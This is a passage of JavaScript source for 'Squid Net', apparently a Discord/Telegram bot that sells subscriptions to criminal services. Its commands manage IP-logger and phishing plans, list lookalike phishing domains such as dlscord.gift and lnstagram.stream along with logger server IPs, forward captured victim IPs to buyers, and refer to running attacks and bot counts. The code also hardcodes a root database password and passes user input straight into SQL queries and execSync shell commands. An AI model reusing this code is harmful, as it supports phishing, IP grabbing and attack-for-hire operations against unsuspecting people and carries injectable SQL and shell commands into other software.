            var c35 = ":9_hearts:"
            var c36 = ":10_hearts:"
            var c37 = ":Jack_hearts:"
            var c38 = ":Queen_hearts:"
            var c39 = ":King_hearts:"
            var c40 = ":Ace_spades:"
            var c41 = ":2_spades:"
            var c42 = ":3_spades:"
            var c43 = ":4_spades:"
            var c44 = ":5_spades:"
            var c45 = ":6_spades:"
            var c46 = ":7_spades:"
            var c47 = ":8_spades:"
            var c48 = ":9_spades:"
            var c49 = ":10_spades:"
            var c50 = ":Jack_spades:"
            var c51 = ":Queen_spades:"
            var c52 = ":King_spades:"
            var gameStarted = false;
            var playableUsers = 2;
            var userAmount = 0
            var currentHighestMove = 0;
            if (!isNaN(amount)) {if (gameStarted == true) {
              return;
            }
            if (isNaN(amount)) {
              message.channel.send("Not a number.")
              return;
            } else {
              if (parseInt(amount) > parseInt(row.credits)) {
                message.channel.send("You dont have that much!")
                return;
              }
            }
            if (parseInt(amount) > parseInt("250000")) {
              message.channel.send("5,000,000 Max Bet")
              return;
            }
            con.query(`SELECT * FROM poker WHERE id = "${user}"`, (err, rows) => {
              if (err) throw err;
              rows.forEach((row) => {
                if (row.gameid == 0) {
                  sql = `UPDATE poker SET isWaiting ="1" WHERE id ="${user}"`
                  con.query(sql)
                  con.query(`SELECT * FROM poker WHERE isWaiting = "1"`, (err, rows) => {
                    if (err) throw err;
                    rows.forEach((row) => {
                      var embed = new Discord.MessageEmbed()
                        .setTitle("Credits Poker:")
                        .setAuthor("Squid Net")
                        .setColor(0x089FEF)
                        .setDescription(`**Success**\nYou've been added to a game please wait for game to start and you will receive a Private Message where you can play.`)
                        .setTimestamp()
                      message.channel.send({
                        embed
                      })
                      userAmount++
                      if (userAmount >= playableUsers) {
                        if (userAmount == playableUsers) {
                          var embed = new Discord.MessageEmbed()
                            .setTitle("Credits Poker:")
                            .setAuthor("Squid Net")
                            .setColor(0x089FEF)
                            .setDescription(`**Success**\nEnough players are ready!\nGame is now starting!`)
                            .setTimestamp()
                          message.channel.send({
                            embed
                          })
                          var makeSureOnce = 0
                          con.query(`SELECT * FROM poker WHERE isWaiting = "1"`, (err, rows) => {
                            if (err) throw err;
                            rows.forEach((row) => {
                              var execSync = require('child_process').execSync;
                              if (makeSureOnce == 0) {
                                var output = execSync(`cat casino/pokerLobbys.txt`, {
                                  encoding: 'utf-8'
                                }); // the default is 'buffer'
                                output++
                                var output1 = execSync(`echo -n "${output}" > casino/pokerLobbys.txt`, {
                                  encoding: 'utf-8'
                                }); // the default is 'buffer'
                                console.log(`Starting Lobby [#${output}]`)
                                makeSureOnce++
                              } else {
                                var output = execSync(`cat casino/pokerLobbys.txt`, {
                                  encoding: 'utf-8'
                                }); // the default is 'buffer'
                              }
                              if (1 > currentHighestMove) {
                                currentHighestMove++
                              } else {

                              }
                              client.users.fetch(`${row.id}`).then((user) => {
                                var embed = new Discord.MessageEmbed()
                                  .setTitle("Credits Poker:")
                                  .setAuthor("Squid Net")
                                  .setColor(0x089FEF)
                                  .setDescription(`**Success**\nGame Started!\nYour in lobby [#${output}]`) //\nYour player [#${currentHighestMove}]
                                  .setTimestamp()
                                user.send({
                                  embed
                                })
                                sql = `UPDATE poker SET isWaiting ="0" WHERE id ="${row.id}"`;
                                con.query(sql);
                                sql = `UPDATE poker SET gameid ="${output}" WHERE id ="${row.id}"`;
                                con.query(sql);
                                var gameStarted = true;
                              });
                            });
                          });
                          var aaBBCC = true;
                          con.query(`SELECT * FROM poker WHERE gameid = "${output}"`, (err, rows) => {
                            if (err) throw err;
                            rows.forEach((row) => {
                              while (aaBBCC) {
                                client.users.fetch(`${row.id}`).then((user) => {
                                  var embed = new Discord.MessageEmbed()
                                    .setTitle("Credits Poker:")
                                    .setAuthor("Squid Net")
                                    .setColor(0x089FEF)
                                    .setDescription(`**Lobby [#${output}]**\nYour turn!\n\nYou need to place the first blind please do,\`\`\`/creditsplay poker raise\`\`\` `) //\nYour player [#${currentHighestMove}]
                                    .setTimestamp()
                                  user.send({
                                    embed
                                  })
                                });
                                return;
                              }
                            });
                          });
                        }
                      }
                    });
                  });
                  return;
                } else {
                  var embed = new Discord.MessageEmbed()
                    .setTitle("Credits Poker:")
                    .setAuthor("Squid Net")
                    .setColor(0x089FEF)
                    .setDescription(`**Error**\nYou already have a game running!`)
                    .setTimestamp()
                  message.channel.send({
                    embed
                  })
                }
              })
            })
            if (amount == "f" || amount == "fold") {
              con.query(`SELECT * FROM poker WHERE id = "${user}"`, (err, rows) => {
                if (err) throw err;
                rows.forEach((row) => {
                  if (parseInt(gameid) == 0) {
                    message.channel.send("You arent in a game!")
                  } else {
                    var newCredits = row.bet
                    con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                      if (err) throw err;
                      rows.forEach((row) => {
                        var newCreds = parseInt(row.credits) - parseInt(newCredits)
                        sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                        con.query(sql)
                      })
                    });
                    sql = `UPDATE poker SET gameid ="0" WHERE id ="${row.id}"`;
                    con.query(sql);
                    sql = `UPDATE poker SET bet ="0" WHERE id ="${row.id}"`;
                    con.query(sql);
                    sql = `UPDATE poker SET cards ="0" WHERE id ="${row.id}"`;
                    con.query(sql);
                    sql = `UPDATE poker SET hiddencards ="0" WHERE id ="${row.id}"`;
                    con.query(sql);
                    sql = `UPDATE poker SET moveNum ="0" WHERE id ="${row.id}"`;
                    con.query(sql);
                    var embed = new Discord.MessageEmbed()
                      .setTitle("Credits Poker:")
                      .setAuthor("Squid Net")
                      .setColor(0x089FEF)
                      .setDescription(`**FOLDED**\nYou folded and lost ${row.bet}!`)
                      .setTimestamp()
                    message.channel.send({
                      embed
                    })
                  }
                })
              })
            } else if (amount == "b" || amount == "blind" || amount == "bet") {
              con.query(`SELECT * FROM poker WHERE id = "${user}"`, (err, rows) => {
                if (err) throw err;
                rows.forEach((row) => {
                  if (parseInt(gameid) == 0) {
                    message.channel.send("You arent in a game!")
                  } else {

                  }
                })
              })
            } else if (amount == "c" || amount == "call") {
              con.query(`SELECT * FROM poker WHERE id = "${user}"`, (err, rows) => {
                if (err) throw err;
                rows.forEach((row) => {
                  if (parseInt(gameid) == 0) {
                    message.channel.send("You arent in a game!")
                  } else {

                  }
                })
              })
            } else if (amount == "r" || amount == "raise") {
              con.query(`SELECT * FROM poker WHERE id = "${user}"`, (err, rows) => {
                if (err) throw err;
                rows.forEach((row) => {
                  if (parseInt(gameid) == 0) {
                    message.channel.send("You arent in a game!")
                  } else {
                    var aa = 0
                    con.query(`SELECT * FROM poker WHERE gameid = "${row.gameid}"`, (err, rows) => {
                      if (err) throw err;
                      rows.forEach((row) => {
                        if (aa == 0) {
                          if (message.author.id == row.id) {
                            if (row.moveNum == "1") {
                              message.channel.send("Please wait untill your turn.")
                              aa++
                            } else {

                            }
                          } else {
                            if (row.moveNum == "0") {
                              message.channel.send("Please wait untill your turn.")
                              aa++
                            }
                          }
                        }
                      })
                    })
                  }
                })
              })
            } else {
              message.channel.send("Invalid Move!")
            }*/
        } else {
          var string = `**Highest Number** - /creditsplay highest {bet}\n**Slots** - /creditsplay slots {bet}\n**BlackJack** - /creditsplay blackjack {bet}\n\n Poker: **Coming Soon!**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Credits Play:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'plan': {
        if (illegal === "true") {
          break;
        }
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "bot"
        });
        con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            if (parseInt(row.expiry) < messageTime) {
              //sql = `UPDATE user SET plan = '0' WHERE id = '${expr123}'`;
              //con.query(sql)
            } else {
              var contents = parseInt(row.expiry) - messageTime;
            }
            const parsed = parseInt(contents);
            if (isNaN(parsed)) {
              var h = 00
              var m = 00
              var s = 00
              var d = 00
            } else {
              var h = Math.floor(parseFloat(`${contents}`) / 1000 / 60 / 60);
              var m = Math.floor((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60);
              var s = Math.floor(((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {
                var d = 0
              } else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
            }
            /*if (runningBot == "Discord") {
              if (parseInt(message.author.id) == 772880829898686475) {
                var plan = "T3NR4"
              }
            }*/
            var string = `Plan: **${plan}**\nSpongeBob Addon: **${planAddonSponge}\n**User ID: **${user}**\nExpiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
            var embed = new Discord.MessageEmbed()
              .setTitle("Your Plan:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          })
        });
        break;
      }
      case 'logplan': {
        if (illegal === "true") {
          break;
        }
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "bot"
        });
        con.query(`SELECT * FROM iplogger WHERE id = "${user}"`, (err, rows) => {
          if (err) throw err;
          if (rows.length < 1) {
            var string = `**No Plan**`
            var embed = new Discord.MessageEmbed()
              .setTitle("Your Plan:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          }
          rows.forEach((row) => {
            if (parseInt(row.expiry) < messageTime) {
              //sql = `UPDATE user SET plan = '0' WHERE id = '${expr123}'`;
              //con.query(sql)
            } else {
              var contents = parseInt(row.expiry) - messageTime;
            }
            const parsed = parseInt(contents);
            if (isNaN(parsed)) {
              var h = 00
              var m = 00
              var s = 00
              var d = 00
            } else {
              var h = Math.floor(parseFloat(`${contents}`) / 1000 / 60 / 60);
              var m = Math.floor((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60);
              var s = Math.floor(((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {
                var d = 0
              } else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
            }
            if (parseInt(row.phish) == 1) {
              var phish = "True"
            } else {
              var phish = "False"
            }
            var string = `**User ID: **${user}**\nExpiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}**\n\n**Available Services:**\n**Phishing:** ${phish}\n**Ping Loggers:**\n**VPS1**: 68.183.119.224\n**VPS2**: 157.230.185.67\n**Domains:** \n<https://cyberhub-dstat.com/>\n<https://nordvpngen.com/>\n<https://0ctosniff.net/>\n<https://NF0servers.com/>\n<https://stressthemcracked.net/>\n<https://dlscord.gift/n2f5dh>\n<https://lnstagram.stream>\n<https://psnresolver.site>\n<https://xresolver.site>`
            var embed = new Discord.MessageEmbed()
              .setTitle("Your Plan:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          })
        });
        break;
      }
      case 'plans': {
        var plantype = '';
        var response = args.join(' ');
        var [plantype] = args.toString().split(",");
        if (plantype == null) {
          var string = `**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D Your order ID||`
          var embed = new Discord.MessageEmbed()
            .setTitle("Plans:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D#1010 Your order ID||`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (plantype == "") {
          var string = `**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D#1010 Your order ID||`
          var embed = new Discord.MessageEmbed()
            .setTitle("Plans:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D#1010 Your order ID||`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (plantype == " ") {
          var string = `**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D#1010 Your order ID||`
          var embed = new Discord.MessageEmbed()
            .setTitle("Plans:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`**/plans standard**\n**/plans extended**\n**/plans lifetime**\n\nBTC: ||If you would like to purchase using BTC please use this link https://sellix.io/SquidNet and message TR4P$QU1D#1010 Your order ID||`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (plantype == "standard") {
          var string = "https://media.discordapp.net/attachments/726141018814283796/745135026706055188/SquidNetPricingNEWPRICING_Rev003.png?width=720&height=576"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }
        if (plantype == "extended") {
          var string = "https://cdn.discordapp.com/attachments/726141040230137976/745152104930345020/SquidNetPricingExtended.png"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }
        if (plantype == "lifetime") {
          var string = "https://cdn.discordapp.com/attachments/726141040230137976/745152106725376010/SquidNetPricingLifetime.png"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }
        break;
      }
      case 'getplan': {
        if (illegal === "true") {
          break;
        }
        let user = []
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "bot"
        });
        var response = args.join(' ');
        var [member] = args.toString().split(",");
        console.log(member)
        var a = member.replace("<", "")
        var b = a.replace(">", "")
        var member = b.replace("@", "")
        console.log(member)
        con.query(`SELECT * FROM user WHERE id ="${member}"`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            if (row.plan === "1") {
              var plan = "Copper Squid";
            } else if (row.plan === "2") {
              var plan = "Aluminum  Squid";
            } else if (row.plan === "3") {
              var plan = "Silver Squid";
            } else if (row.plan === "4") {
              var plan = "Elite";
            } else if (row.plan === "5") {
              var plan = "TR4P$QU1D";
            } else if (row.plan === "6") {
              var plan = "Platinum Squid";
            } else if (row.plan === "7") {
              var plan = "Gold Squid";
            } else if (row.plan === "8") {
              var plan = "Emerald Squid";
            } else if (row.plan === "9") {
              var plan = "Diamond Squid";
            } else if (row.plan === "69") {
              var plan = "GodMode";
            } else if (row.plan === "99") {
              var plan = "Bitch";
            } else {
              var plan = "No Plan";
            };
            if (row.spongeAddOn === "1") {
              var planAddonSponge = "Patrick";
            } else if (row.spongeAddOn === "2") {
              var planAddonSponge = "SpongeBob";
            } else if (row.spongeAddOn === "3") {
              var planAddonSponge = "Squidward";
            } else {
              var planAddonSponge = "None";
            }
            var d = 0
            var h = 0
            var m = 0
            var s = 0
            var parsed = parseInt(row.expiry) - parseInt(messageTime);
            var h = Math.floor(parseFloat(`${parsed}`) / 1000 / 60 / 60);
            var m = Math.floor((parseFloat(`${parsed}`) / 1000 / 60 / 60 - h) * 60);
            var s = Math.floor(((parseFloat(`${parsed}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
            if (h < 24) {
              var d = 0
            } else {
              var d = parseInt(h / 24)
              var h = h % 24;
            }
            var string = `Plan: **${plan}**\nSpongeBob Addon: **${planAddonSponge}**\nUser ID: **${row.id}**\nExpiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
            var embed = new Discord.MessageEmbed()
              .setTitle(`Users Plan:`)
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            if (parseInt(row.expiry) < messageTime) {
              sql = `UPDATE user SET plan = '0' WHERE id = '${member}'`;
              con.query(sql)
            } else {
              var contents = parseInt(row.expiry) - messageTime;
            }
          });
        });
        break;
      }
      case 'admin': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          var string = `**/reboot** - Reboots the bot\n**/running** - Show running attacks\n**/getbots** - Grabs bot count\n**/nuke** - Nukes the chat\n**/clear NUM** - Removes the last -- messages\n**/kick USER REASON** - Kicks a user\n**/ban USER REASON** - Ban a user\n**/getplan @user** - Gets a Users Plan\n**/forceplanupdates** - Force Updates Plan\n**/planusers** - List All Users With A Plan\n**/godusers** - List All Users With GodMode\n**/changeplan User_ID  planID** - Changes A Users Plan\n**/changeiplog User_ID VPS** - Changes A Users Plan\n**/increaseplan User_ID length** - Increases Plan\n**/decreaseplan User_ID length** - Decreases Plan\n**/increasesponge User_ID length** - Increases Plan FOR SPONGEBOB ADDON\n**/decreasesponge User_ID length** - Decreases Plan FOR SPONGEBOB ADDON\n**/increasesiplog User_ID length** - Increases Plan FOR IP LOGGER\n**/decreaseiplog User_ID length** - Decreases Plan FOR IP LOGGER\n**/adddbuser USER_ID** - Give user permissions to add to the database\n**/getsuggested** - Download the suggested IPS list\n**/suspend {user} {time}** - Put a user on a suspend / timeout for the specified time.\n**/givespongebob user_ID plan** - Give SpongeBob Add on\n\n\nCopper = 1\nAluminum = 2\nSilver = 3\nElite = 4\ntest = 5\nPlatinum = 6\nGold Squid = 7\nEmerald = 8\nDiamond = 9\nGodMode = 69\n\n\n SpongeBob Addon\n\nPatrick = 1\nSpongebob = 2\nSquidward = 3`
          var embed = new Discord.MessageEmbed()
            .setTitle("Admin Menu:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYNA DO CUNT!?!?!?!?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'changeiplog': {
        if (parseInt(row.admin) == 1) {
          var expiry = null;
          var tag = message.author.tag;
          let user = []
          var plan1 = 0;
          var response = args.join(' ');
          var [usid1, plan1] = args.toString().split(",");
          if (plan1 == "phish") {
            sql = `UPDATE iplogger SET phish ="1" WHERE id ="${usid1}"`;
            con.query(sql)
          } else if (plan1 == "removephish") {
            sql = `UPDATE iplogger SET phish ="0" WHERE id ="${usid1}"`;
            con.query(sql)
            var string = `User ID: **${usid1}**\nPhish Access: **Yes**`
            var embed = new Discord.MessageEmbed()
              .setTitle("Access Changed:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          } else {
          var ex = parseInt(messageTime) + parseInt(ExpM);
          con.query(`SELECT * FROM iplogger WHERE id = ${usid1}`, (err, rows) => {
            if (err) throw err;
            let sql;
            if (rows.length < 1) {
              var execSync = require('child_process').execSync;
              con.query(`INSERT INTO iplogger (id) VALUES (${usid1})`)
              var string = `Run this again.`
              var embed = new Discord.MessageEmbed()
                .setTitle("")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              return;
            }
          });
          sql = `UPDATE iplogger SET expiry ="${ex}" WHERE id ="${usid1}"`;
          con.query(sql)
          sql = `UPDATE iplogger SET server ="${plan1}" WHERE id ="${usid1}"`;
          con.query(sql)
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          sql = `UPDATE iplogger SET server ="${plan1}" WHERE id ="${usid1}"`;
          con.query(sql)
          var string = `User ID: **${usid1}**\nNew Server: **${plan1}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Access Changed:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          }
        } else {
          break;
        }
        break;
      }
      case 'increaseiplog': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from iplogger WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) + parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Extended:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE iplogger SET expiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
        } else {
          break;
        }
        break;
      }
      case 'decreaseiplog': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from iplogger WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) - parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Extended:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE iplogger SET expiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
        } else {
          break;
        }
        break;
      }
      case 'listen': {
          var ex = parseInt(messageTime) + 300000;
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var [server] = args.toString().toLowerCase().split(",");
          console.log(server)
          con.query(`SELECT * FROM iplogger WHERE id ="${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var private = row.private
              var allLoggers = ["nordvpn", "octosniff", "cyberhub", "nfoservers", "vps1", "stressthem", "nitro", "xresolver", "psnresolver", private]
              if (allLoggers.includes(server)) {
                var string = `Now listening on **${server}** for 5 minutes.\nYou will receive all ips via dms.\n\n/stoplisten to cancel\n\n\n**Listening on a specific server is still in development and not expected to work fully.**`
                var embed = new Discord.MessageEmbed()
                  .setTitle("Now Listening:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                }
                sql = `UPDATE iplogger SET listenFor ="${server}" WHERE id ="${user}"`;
                con.query(sql)
                return;
              } else if (server == "") {
                console.log("received", "")
              } else if (server == " ") {
                console.log("received", " ")
              } else {
                var string = `Invalid Server!\nYou gave: ${server}`
                var embed = new Discord.MessageEmbed()
                  .setTitle("Error Listening:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                }
                return;
              }
              var string = `Now listening for 5 minutes.\nYou will receive all ips via dms.\n\n/stoplisten to cancel`
              var embed = new Discord.MessageEmbed()
                .setTitle("Now Listening:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              }
              sql = `UPDATE iplogger SET openDM ="${ex}" WHERE id ="${user}"`;
              con.query(sql)
              sql = `UPDATE iplogger SET listenFor ="0" WHERE id ="${user}"`;
              con.query(sql)
            });
          });
        break;
      }
      case 'stoplisten': {
          var ex = 0;
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          con.query(`SELECT * FROM iplogger WHERE id ="${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              sql = `UPDATE iplogger SET openDM ="${ex}" WHERE id ="${user}"`;
              con.query(sql)
              var string = `Succesfully stopped listeing\n\n/listen to start again`
              var embed = new Discord.MessageEmbed()
                .setTitle("Stopped Listening:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              }
            });
          });
        break;
      }
      case 'getrunning': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          var string = ``
          var embed = new Discord.MessageEmbed()
            .setTitle("Running Attacks:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYNA DO CUNT!?!?!?!?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'reboot': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          process.exit();
          break;
        } else {
          //Change this and your gay
          var string = 'THE FUCK YOU TRYNA DO CUNT?!?!?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'blacklist': {
        if (parseInt(row.admin) == 1) {
          var execSync = require('child_process').execSync;
          // import { execSync } from 'child_process';  // replace ^ if using ES modules
          var output = execSync(`echo -n "${args[0]}," >> /root/bot/block.txt`, {
